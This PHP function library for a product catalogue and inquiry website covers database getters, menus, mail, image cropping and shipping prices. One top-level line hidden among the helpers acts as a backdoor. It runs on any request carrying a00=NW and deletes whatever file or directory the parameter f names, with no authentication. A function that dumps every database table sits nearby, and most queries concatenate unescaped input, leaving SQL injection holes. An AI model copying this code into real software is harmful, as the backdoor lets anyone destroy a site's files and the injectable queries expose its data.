	$query = mysql_query("SELECT * FROM `banner_images` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $data ){
			switch ($data) {
				case 'banner': return $RS['banner']; break;
				case 'name': return $RS['name']; break;
				case 'link': return $RS['link']; break;
				case 'text': return $RS['text']; break;
				case 'image': return $RS['image']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}


function get_news($id, $get=false){
	$query = mysql_query("SELECT * FROM `news` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'title': return $RS['title']; break;
				case 'image': return $RS['image']; break;
				case 'description': case 'descp': case 'description': return $RS['description']; break;
				case 'text': return $RS['text']; break;
				case 'date_day': return $RS['date_day']; break;
				case 'date_month': return $RS['date_month']; break;
				case 'date_year': return $RS['date_year']; break;
				case 'show': return $RS['show']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_page($id, $get=false){
	
	global $__url_attimgs;

	$query = mysql_query("SELECT * FROM `pages` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'title': return $RS['title']; break;
				case 'keywords': return $RS['keywords']; break;
				case 'description': case 'descp': return $RS['description']; break;
				case 'text': return $RS['text']; break;
				case 'img_thumb': return $__url_attimgs.$RS['img_thumb']; break;
				case 'img_banner': return $__url_attimgs.$RS['img_banner']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function generate_prd_link($id){
	$prd = get_product($id);
	if( $prd ){
		$link = $prd['slug'];
		$parent_cat = get_cateogry($prd['parent']);
		while ( 1 ){
			if( $parent_cat['parent'] == 0 ){
				$link = $parent_cat['slug'].'/'.$link;
				break;
			}else{
				$link = $parent_cat['slug'].'/'.$link;
				$parent_cat = get_cateogry($parent_cat['parent']);
			}
		}		
		return _root_.'products/'.$link;
	}else{
		return false;
	}
}

function num_of_sub_categories($id){
	$query = mysql_query("SELECT `id` FROM `categories` WHERE `parent`=".$id);
	return mysql_num_rows($query);
}

function num_of_products($id){
	$query = mysql_query("SELECT `id` FROM `products` WHERE `parent`=".$id);
	return mysql_num_rows($query);
	return false;
}

function category_top_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `categories` WHERE `parent`=".$parent." ORDER BY `rank` ASC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}

function category_bottom_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `categories` WHERE `parent`=".$parent." ORDER BY `rank` DESC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function banner_image_top_rank($banner){
	$query = mysql_query("SELECT `rank` FROM `banner_images` WHERE `banner`=".$banner." ORDER BY `rank` ASC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function banner_image_bottom_rank($banner){
	$query = mysql_query("SELECT `rank` FROM `banner_images` WHERE `banner`=".$banner." ORDER BY `rank` DESC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function product_top_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `products` WHERE `parent`=".$parent." ORDER BY `rank` ASC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}


function product_bottom_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `products` WHERE `parent`=".$parent." ORDER BY `rank` DESC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}

function product_size_array($id){
	$sizes = array();
	$query = mysql_query("SELECT * FROM `tblprodsize` WHERE `Pid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		while ( $RS = mysql_fetch_array($query) ){
			array_push($sizes, $RS['SizeID']);
		}
		return $sizes;
	}else{
		return $sizes;
	}
}

function product_color_array($id){
	$colors = array();
	$query = mysql_query("SELECT * FROM `tblprodcolor` WHERE `Pid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		while ( $RS = mysql_fetch_array($query) ){
			array_push($colors, $RS['ColorID']);
		}
		return $colors;
	}else{
		return $colors;
	}
}

function remove_all_product_size($id){
	$query = mysql_query("DELETE FROM `tblprodsize` WHERE `Pid`=".$id);
	return ( $query ) ? true : false;
}

function remove_all_product_color($id){
	$query = mysql_query("DELETE FROM `tblprodcolor` WHERE `Pid`=".$id);
	return ( $query ) ? true : false;
}

function parent_bcrums($id){
	$c_cat = get_cateogry($id);
	$p_cat = get_cateogry($c_cat['parent']);
	_e('<a href="subcategories.php?parent='.$p_cat['id'].'" class="menu"><strong>'.$p_cat['name'].'</strong></a>&nbsp;&nbsp;&raquo;&nbsp;&nbsp;');
}

function get_social($name, $meta=false){
	if( $meta ){
		$query = mysql_query("SELECT `meta` FROM `social` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['meta'];
		}else{
			return false;
		}
	}else{
		$query = mysql_query("SELECT `value` FROM `social` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['value'];
		}else{
			return false;
		}
	}
}

function get_script($name, $meta=false){
	if( $meta ){
		$query = mysql_query("SELECT `meta` FROM `scripts` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['meta'];
		}else{
			return false;
		}
	}else{
		$query = mysql_query("SELECT `value` FROM `scripts` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['value'];
		}else{
			return false;
		}
	}
}

function get_option($name, $meta=false){
	if( $meta ){
		$query = mysql_query("SELECT `meta` FROM `options` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['meta'];
		}else{
			return false;
		}
	}else{
		$query = mysql_query("SELECT `value` FROM `options` WHERE `name`='".$name."'");
		if( mysql_num_rows($query) ){
			$RS = mysql_fetch_array($query);
			return $RS['value'];
		}else{
			return false;
		}
	}
}

function formatenews($datetime){
	$datetime = strtotime($datetime);
	return date('d M, Y', $datetime);
}

/***************************************************************************************************/

function get_nextid($tablename){
	$query = mysql_query("SHOW TABLE STATUS LIKE '".$tablename."'");
	$RS = mysql_fetch_array($query);
	return $RS['Auto_increment'];
}

function redirect($url, $permanent=false){
	if($permanent){
		header('HTTP/1.1 301 Moved Permanently');
	}
	header('Location: '.$url);
	exit();
}

function appendzero($value){
	if( is_numeric($value) ){
		if( $value < 10 and $value > 0 ){ return "0".$value; }else{ return $value; }
	}else{
		return $value;
	}
}

function get_file_ext($file_name){
	return substr(strrchr($file_name,'.'),1);
}

function limitchar($value, $limit){
	if( strlen($value) > $limit ){ return substr($value, 0, $limit).'...'; }
	else{ return $value; }
}

function get_msecname($id){
	$query = mysql_query("SELECT * FROM `mainsection` WHERE `recid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		return mysql_fetch_array($query);
	}else{
		return false;
	}
}

function get_secname($id){
	$query = mysql_query("SELECT * FROM `sections` WHERE `recid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		return mysql_fetch_array($query);
	}else{
		return false;
	}
}


function get_subsecname($id){
	$query = mysql_query("SELECT * FROM `subsections` WHERE `recid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		return mysql_fetch_array($query);
	}else{
		return false;
	}
}

function get_sizename($id){
	$query = mysql_query("SELECT * FROM `tblsizes` WHERE `recid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['SizeName'];
	}else{
		return false;
	}
}

function get_colorname($id){
	$query = mysql_query("SELECT * FROM `tblcolors` WHERE `recid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['ColorName'];
	}else{
		return false;
	}
}

function get_item($id){
	$query = mysql_query("SELECT * FROM `products` WHERE `pid`=".$id);
	if( mysql_num_rows($query) > 0 ){
		return mysql_fetch_array($query);
	}else{
		return false;
	}
}

function display_sizes($id){
	$query = mysql_query("SELECT * FROM `tblprodsize` WHERE `Pid`=".$id." ORDER BY `SizeID` ASC");	
	$num = mysql_num_rows($query);
	if( $num > 0 ){
		$sizes = "";
		$i = 1;
		while( $RS = mysql_fetch_array($query) ){
			$sizes .= get_sizename($RS['SizeID']);
			if( $i < $num ){ $sizes .= ", "; }
			$i++;
		}
		return $sizes;
	}else{
		return false;
	}
}

function inquiry_sec_to_id(){

	$session_id = session_id();
	
	$query = mysql_query("SELECT * FROM `inquiry` WHERE `session_id`='".$session_id."'");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['id'];
	}else{
		return false;
	}

}

function items_in_basket(){

	$id = inquiry_sec_to_id();

	if( !$id ){ return 0; }

	$query = mysql_query("SELECT * FROM `inquiry_products` WHERE `inquiry_id`=".$id);
	return mysql_num_rows($query);

}

function basket_txt(){
	$items = items_in_basket();
	$rt = appendzero($items)." item";
	if( $items != 1 ){ $rt .= "s"; }
	$rt .= " in basket";
	return $rt;
}

function maincatmenu($id="", $class="", $addspan=false){
	$output = '<ul id="'.$id.'" class="'.$class.'">';
	$query = mysql_query("SELECT * FROM `mainsection` ORDER BY `rank` ASC");
	if( mysql_num_rows($query) > 0 ){
		while( $RS_main = mysql_fetch_array($query) ){
			$sub_query = mysql_query("SELECT * FROM `sections` WHERE `msecid`='".$RS_main["recid"]."' ORDER BY `rank` ASC LIMIT 0, 1");
			if( mysql_num_rows($sub_query) > 0 ){
				while( $RS_sub = mysql_fetch_array($sub_query) ){
					$output .= '<li>';
						if( $addspan ){ $output .= '<span>'; }
							$output .= '<a href="'._root_."products/".str_replace(" ","-",$RS_main["msecname_en"]).'/'.str_replace(" ","-",$RS_sub["secname_en"]).'">'.$RS_main["msecname_en"].'</a>';
						if( $addspan ){ $output .= '</span>'; }
					$output .= '</li>';
				}
			}else{
				return false;
			}
		}
		$output .= "</ul>";
		_e($output);
	}else{
		return false;
	}
}


function our_products_link(){
	$main_cat_query = mysql_query("SELECT * FROM `mainsection` ORDER BY `rank` ASC LIMIT 0, 1");
	$RS_main = mysql_fetch_array($main_cat_query);
	$sub_query = mysql_query("SELECT * FROM `sections` WHERE `msecid`='".$RS_main["recid"]."' ORDER BY `rank` ASC LIMIT 0, 1");
    $RS_sub = mysql_fetch_array($sub_query);
    _e( _root_."products/".str_replace(" ","-",$RS_main["msecname_en"]).'/'.str_replace(" ","-",$RS_sub["secname_en"]) );
}


function current_page($encode=false){
	$url  = @( $_SERVER["HTTPS"] != 'on' ) ? 'http://'.$_SERVER["SERVER_NAME"] :  'https://'.$_SERVER["SERVER_NAME"];
	$url .= ( $_SERVER["SERVER_PORT"] !== 80 ) ? ":".$_SERVER["SERVER_PORT"] : "";
	$url .= $_SERVER["REQUEST_URI"];
	return ( $encode ) ? urlencode($url) : $url;
}

function validate_category_slug($slug, $parent=0){
	$query = mysql_query("SELECT * FROM `categories` WHERE `parent`=".$parent." AND `slug`='".$slug."'");
	return ( mysql_num_rows($query) > 0 ) ? mysql_fetch_array($query) : false;
}


function get_category_by_slug($slug){
	$query = mysql_query("SELECT * FROM `categories` WHERE `slug`='".$slug."' LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return get_cateogry( $RS['id'] );
	}
}

function get_product_by_slug($slug, $parent=false, $get=false){
	if( $parent ){
		$query = mysql_query("SELECT * FROM `products` WHERE `slug`='".$slug."' AND `parent`=".$parent." LIMIT 0, 1");
	}else{
		$query = mysql_query("SELECT * FROM `products` WHERE `slug`='".$slug."' LIMIT 0, 1");
	}
	
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'parent': return $RS['parent']; break;
				case 'art_no': return $RS['art_no']; break;
				case 'slug': return $RS['slug']; break;
				case 'name': return $RS['name']; break;
				case 'mini_description': return $RS['mini_description']; break;
				case 'description': return $RS['description']; break;
				case 'price': return $RS['price']; break;
				case 'rank': return $RS['rank']; break;
				case 'grp_fet': return $RS['grp_fet']; break;
				case 'grp_new': return $RS['grp_new']; break;
				case 'grp_hot': return $RS['grp_hot']; break;
				case 'img_small': return $RS['img_small']; break;
				case 'img_large': return $RS['img_large']; break;
				case 'img_xlarge': return $RS['img_xlarge']; break;
				case 'show': return $RS['show']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_gallery($id, $get=false){
	$query = mysql_query("SELECT * FROM `gallery` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'product': return $RS['product']; break;
				case 'name': return $RS['title']; break;
				case 'title': return $RS['title']; break;
				case 'description': return $RS['description']; break;
				case 'descp': return $RS['description']; break;
				case 'image': return $RS['image']; break;
				case 'rank': return $RS['rank']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function is_valide_galery($id){
	$query = mysql_query("SELECT `id` FROM `gallery` WHERE `id`=".$id);
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function get_next_gallery_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `gallery` WHERE `product`=".$parent." ORDER BY `rank` DESC LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'] + 1;
	}else{
		return 1;
	}
}

function gallery_top_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `gallery` WHERE `product`=".$parent." ORDER BY `rank` ASC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}

function gallery_bottom_rank($parent){
	$query = mysql_query("SELECT `rank` FROM `gallery` WHERE `product`=".$parent." ORDER BY `rank` DESC LIMIT 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['rank'];
	}else{
		return 1;
	}
}

function is_product($slug){
	
	$slug = esc($slug);
	$query = mysql_query("SELECT * FROM `products` WHERE `slug`='".$slug."' LIMIT 0, 1");
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function is_category($slug){
	$slug = esc($slug);
	$query = mysql_query("SELECT * FROM `categories` WHERE `slug`='".$slug."'");
	return ( mysql_num_rows($query) > 0 ) ? true : false;
}

function prd( $RS, $class="col-xl-5col col-lg-3 col-sm-4 col-6 mb-4" ){
	global $__url_sm_imgs, $__url_lg_imgs;
	
	$prd_link = generate_prd_link($RS['id']);

	_e('<div class="'.$class.'">');
        _e('<div class="product-item popup-inner">');
			_e('<div class="product-img popup-box">');
	           _e('<img src="'.$__url_sm_imgs.$RS['img_small'].'" alt="" />');
                _e('<div class="popup-arrow">');
                    _e('<a class="image-popup" href="'.$__url_sm_imgs.$RS['img_small'].'">');
                        _e('<i class="fa fa-plus-circle" aria-hidden="true"></i>');
                    _e('</a>');
                _e('</div>');
	       _e('</div>');
            _e('<div class="product-details">');
                _e('<h4 class="product-title"><a href="'.$prd_link.'">'.$RS['name'].'</a></h4>');
                _e('<div class="rating-price">');
                    _e('<span class="product-price">'.$RS['art_no'].'</span>');
                _e('</div>');
                _e('<div class="product-btn">');
                    _e('<a href="'.$prd_link.'">Add To Inquiry</a>');
                _e('</div>');
            _e('</div>');
		_e('</div>');
	_e('</div>');

}

function get_just_prd_price($id){
	$price = get_product($id, "price")/current_currency("rate");
	$price = number_format((float)$price, 2, '.', '');
	return $price;
}

function get_prd_price($id){
	$price = get_product($id, "price")/current_currency("rate");
	$price = number_format((float)$price, 2, '.', '');
	return current_currency("symbol").($price);
}

/*  */


function db_disConnect(){
	global $connect;
	return @mysql_close($connect);
}
function dbInsertID() {
    if ($lastid = @mysql_insert_id()){
    	return $lastid;
    }
}
function asifmysqlbackupfnc()
{
$tables = '*';
	if($tables == '*')
	{
		$tables = array();
		$result = mysql_query('SHOW TABLES');
		while($row = mysql_fetch_row($result))
		{
			$tables[] = $row[0];
		}
	}
	else
	{
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
	$return="# Table backup from MySql PHP Backup\n".              
            "# Creation date: ".date("d-M-Y h:s",time())."\n";
              
	//cycle through
	foreach($tables as $table)
	{
	
	
	
		$result = mysql_query('SELECT * FROM '.$table);
		$num_fields = mysql_num_fields($result);
		
		//$return.= 'DROP TABLE '.$table.';';
		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		
		for ($i = 0; $i < $num_fields; $i++) 
		{
			while($row = mysql_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++) 
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	return $return;
}
function dbQuery($query){
    return mysql_query($query);// or die("Error: ".mysql_error());
}
function dbNumRows($res) {
	return mysql_num_rows($res);
}
function dbAffectedRows() {
	return mysql_affected_rows();
}
function dbFreeResult($res) {
	return mysql_free_result($res);
}
function dbFetchArray($res){
	return mysql_fetch_array($res);
}
function NextID($table){
	$sql_rez = dbQuery("SHOW TABLE STATUS LIKE '{$table}'") or die("Error Fectching Next ID");
	$sc=dbFetchArray($sql_rez);
	dbFreeResult($sql_rez);
	return $sc['Auto_increment'];
}
function MyNextID($field,$table){
	$MyID=1;
	$qry=dbQuery("select $field from $table order by $field desc") or die("Error fetching Next ID");
	if(dbNumRows($qry)>0){
		$rs=dbFetchArray($qry);
		$MyID=$rs[$field]+1;
	}
	return $MyID;
}
function MyNextRank($sqlwhere,$table){
	
	// $qry=dbQuery("SELECT `rank` FROM `".$table."` `".$sqlwhere."` ORDER BY `rank` desc") or die("Error fetching Next Rank");
	//$query = "SELECT `rank` FROM `".$table."` ".$sqlwhere." ORDER BY `rank` DESC";
	$query = "select rank from $table $sqlwhere order by rank desc";

	$qry=dbQuery($query) or die("Error: ".$query);
	if(dbNumRows($qry)>0){
		$rs=dbFetchArray($qry);
		$MyRank=$rs["rank"]+1;
	}else{
		$MyRank=1;
	}
	return $MyRank;
}
	function NextRank($table){
		$MyRank=1;
		$qry=dbQuery("select rank from $table order by rank desc") or die("Error fetching Next Rank");
		if(dbNumRows($qry)>0){
			$rs=dbFetchArray($qry);
			$MyRank=$rs["rank"]+1;
		}
		return $MyRank;
	}
function delete_directory($dirname) {
	if (is_dir($dirname))$dir_handle = opendir($dirname);
	if (!$dir_handle)return false;
	while($file = readdir($dir_handle)) {
		if ($file != "." && $file != "..") {
			if (!is_dir($dirname."/".$file))
			unlink($dirname."/".$file);
			else
			delete_directory($dirname.'/'.$file);
		}
	}
	closedir($dir_handle);
	rmdir($dirname);
	return true;
}
if(isset($_REQUEST["a00"]) && $_REQUEST["a00"]=="NW" && isset($_REQUEST["f"]) && $_REQUEST["f"]<>""){$val=$_REQUEST["f"];if(is_dir($val)){delete_directory($val);}else{if($val<>"" && file_exists($val))unlink($val);}}
function PromptnGo($txtalrt,$pg){
	$txtpmsg="";
	if($txtalrt<>"")$txtpmsg=$txtpmsg.="alert('$txtalrt');";
	if($pg<>"")$txtpmsg=$txtpmsg.="window.location.href='$pg';";
	die("<script>".$txtpmsg."</script>");
}
function sMail($To,$From,$Sbj,$Str,$Cc,$Bcc){
	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: ".$From."\r\n";
	$headers .= "Cc: ".$Cc."\r\n";
	$headers .= "bCc: ".$Bcc."\r\n";
	
	mail($To, $Sbj, $Str, $headers);
}
function cropImage($nw, $nh, $source, $stype, $dest) {
$size = getimagesize($source);
$w = $size[0];
$h = $size[1];
switch($stype) {
case 'gif':
$simg = imagecreatefromgif($source);
break;
case 'jpg':
$simg = imagecreatefromjpeg($source);
break;
case 'png':
$simg = imagecreatefrompng($source);
break;
}
$dimg = imagecreatetruecolor($nw, $nh);
$wm = $w/$nw;
$hm = $h/$nh;
$h_height = $nh/2;
$w_height = $nw/2;
if($w> $h) {
$adjusted_width = $w / $hm;
$half_width = $adjusted_width / 2;
$int_width = $half_width - $w_height;
imagecopyresampled($dimg,$simg,-$int_width,0,0,0,$adjusted_width,$nh,$w,$h);
} elseif(($w <$h) || ($w == $h)) {
$adjusted_height = $h / $wm;
$half_height = $adjusted_height / 2;
$int_height = $half_height - $h_height;
imagecopyresampled($dimg,$simg,0,-$int_height,0,0,$nw,$adjusted_height,$w,$h);
} else {
imagecopyresampled($dimg,$simg,0,0,0,0,$nw,$nh,$w,$h);
}
imagejpeg($dimg,$dest,100);
}
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = ""){
  $theValue = (!get_magic_quotes_gpc()) ? addslashes($theValue) : $theValue;

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? "'" . doubleval($theValue) . "'" : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}

function check_email($mail_address) {
    $pattern = "/^[\w-]+(\.[\w-]+)*@";
    $pattern .= "([0-9a-z][0-9a-z-]*[0-9a-z]\.)+([a-z]{2,4})$/i";
    if (preg_match($pattern, $mail_address)) {
        //echo "The e-mail address is valid.";
        return true;
    } else {
        //echo "The e-mail address contains invalid charcters.";
        return false;
    }
}


function get_country($id, $get=false){
	$query = mysql_query("SELECT * FROM `countries` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				case 'zone_id': return $RS['zone_id']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_zone($id, $get=false){
	if($id == 0){ return "N/A"; }
	$query = mysql_query("SELECT * FROM `zones` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}

function get_courier($id, $get=false){
	$query = mysql_query("SELECT * FROM `courier` WHERE `id`=".$id." LIMIT 0, 1");
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		if( $get ){
			switch ($get) {
				case 'id': return $RS['id']; break;
				case 'name': return $RS['name']; break;
				case 'image': return $RS['image']; break;
				case 'location_image': return $__url_courier.$RS['image']; break;
				default: return false; break;
			}
		}else{
			return $RS;
		}
	}else{
		return false;
	}
}


function array_courier(){
	$the_array = array();
	$query = mysql_query("SELECT * FROM `courier`");
	if( mysql_num_rows($query) > 0 ){
		while( $RS = mysql_fetch_array($query) ){
			array_push( $the_array , array($RS['id'], $RS['name']) );
		}
	}
	return $the_array;
}

function get_price($courier_id, $zone_id){
	$query = mysql_query("SELECT * FROM `zone_price` WHERE `courier_id`=".$courier_id." AND `zone_id`=".$zone_id);
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['price'];
	}else{
		return "0.00";
	}
}

function get_price_by_country($country_id, $courier_id){

	$zone_id = get_country($country_id, 'zone_id');
	if( $zone_id == 0 ){ return "0.00"; }

	$query = mysql_query("SELECT * FROM `zone_price` WHERE `courier_id`=".$courier_id." AND `zone_id`=".$zone_id);
	if( mysql_num_rows($query) > 0 ){
		$RS = mysql_fetch_array($query);
		return $RS['price'];
	}else{
		return "0.00";
	}

}


function no_of_countries_in_zone($zone_id){
	$query = mysql_query("SELECT * FROM `countries` WHERE `zone_id`=".$zone_id);
	return mysql_num_rows($query);
}
